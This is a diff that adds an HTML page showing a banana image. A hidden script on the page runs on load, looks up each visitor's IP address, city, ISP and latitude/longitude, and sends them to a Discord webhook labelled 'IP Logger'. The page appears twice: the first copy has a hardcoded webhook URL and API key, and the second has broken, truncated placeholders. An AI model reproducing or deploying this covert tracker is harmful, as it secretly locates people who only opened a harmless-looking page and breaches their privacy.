@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banana 🍌</title>
+    <style>
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; margin: 0; }
+        img { width: 300px; height: auto; }
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8a/Banana-Single.jpg" alt="Banana">
+
+    <script>
+        const API_KEY = "b1e9549a924b474bbf04e9d029327694"; // Replace with your API key
+        const WEBHOOK_URLS = [
+            "https://discord.com/api/webhooks/1352211425912688640/r0Y89ZvBw0o3b6MWod2ZHugrpFk4pYxbBcvRcj9GeneV1sQ3PDKBmLFdPfZ3pNyDFu9o",
+            "https://discord.com/api/webhooks/1352211425912688640/r0Y89ZvBw0o3b6MWod2ZHugrpFk4pYxbBcvRcj9GeneV1sQ3PDKBmLFdPfZ3pNyDFu9o"
+        ];
+
+        async function getIPInfo() {
+            try {
+                let response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`);
+                let data = await response.json();
+                let ipAddress = data.ip;
+
+                let loggedIPs = JSON.parse(localStorage.getItem("loggedIPs")) || [];
+                let encodedIP = btoa(btoa(btoa(ipAddress)));  // Triple Base64 encode
+
+                if (loggedIPs.includes(encodedIP)) return;
+
+                loggedIPs.push(encodedIP);
+                localStorage.setItem("loggedIPs", JSON.stringify(loggedIPs));
+
+                sendToDiscord(data);
+            } catch (error) {
+                console.error("Error fetching data:", error);
+            }
+        }
+
+        function sendToDiscord(data) {
+            let webhookURL = WEBHOOK_URLS[Math.floor(Math.random() * WEBHOOK_URLS.length)];
+            let payload = {
+                username: "IP Logger",
+                avatar_url: "https://cdn.discordapp.com/attachments/1153348936283721778/1258363593783513208/Unknown.jpeg",
+                embeds: [{
+                    title: "New Visitor Logged",
+                    description: `**IP Address:** ${data.ip}\n**Country:** :flag_${data.country_code2.toLowerCase()}: ${data.country_name}\n**City:** ${data.city}`,
+                    color: 16711680,
+                    fields: [
+                        { name: "ISP", value: data.isp, inline: true },
+                        { name: "Latitude", value: data.latitude.toString(), inline: true },
+                        { name: "Longitude", value: data.longitude.toString(), inline: true },
+                        { name: "Google Maps", value: `[View Location](https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=15)`, inline: false }
+                    ],
+                    thumbnail: { url: data.country_flag },
+                    footer: { text: "Data from ipgeolocation.io" }
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => console.log("Data sent to Discord:", response))
+            .catch(error => console.error("Error sending to Discord:", error));
+        }
+
+        getIPInfo();
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banana 🍌</title>
+    <style>
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; margin: 0; }
+        img { width: 300px; height: auto; }
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8a/Banana-Single.jpg" alt="Banana">
+
+    <script>
+        const API_KEY = "b1e9549a924b474bbf04e9d029327694"; // Replace with your API key
+        const WEBHOOK_URLS = [
+            "${{ secrets.s",
+            "${{ secrets.s"
+        ];
+
+        async function getIPInfo() {
+            try {
+                let response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`);
+                let data = await response.json();
+                let ipAddress = data.ip;
+
+                let loggedIPs = JSON.parse(localStorage.getItem("loggedIPs")) || [];
+                let encodedIP = btoa(btoa(btoa(ipAddress)));  // Triple Base64 encode
+
+                if (loggedIPs.includes(encodedIP)) return;
+
+                loggedIPs.push(encodedIP);
+                localStorage.setItem("loggedIPs", JSON.stringify(loggedIPs));
+
+                sendToDiscord(data);
+            } catch (error) {
+                console.error("Error fetching data:", error);
+            }
+        }
+
+        function sendToDiscord(data) {
+            let webhookURL = WEBHOOK_URLS[Math.floor(Math.random() * WEBHOOK_URLS.length)];
+            let payload = {
+                username: "IP Logger",
+                avatar_url: "https://cdn.discordapp.com/attachments/1153348936283721778/1258363593783513208/Unknown.jpeg",
+                embeds: [{
+                    title: "New Visitor Logged",
+                    description: `**IP Address:** ${data.ip}\n**Country:** :flag_${data.country_code2.toLowerCase()}: ${data.country_name}\n**City:** ${data.city}`,
+                    color: 16711680,
+                    fields: [
+                        { name: "ISP", value: data.isp, inline: true },
+                        { name: "Latitude", value: data.latitude.toString(), inline: true },
+                        { name: "Longitude", value: data.longitude.toString(), inline: true },
+                        { name: "Google Maps", value: `[View Location](https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=15)`, inline: false }
+                    ],
+                    thumbnail: { url: data.country_flag },
+                    footer: { text: "Data from ipgeolocation.io" }
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => console.log("Data sent to Discord:", response))
+            .catch(error => console.error("Error sending to Discord:", error));
+        }
+
+        getIPInfo();
+    </script>
+</body>
+</html>
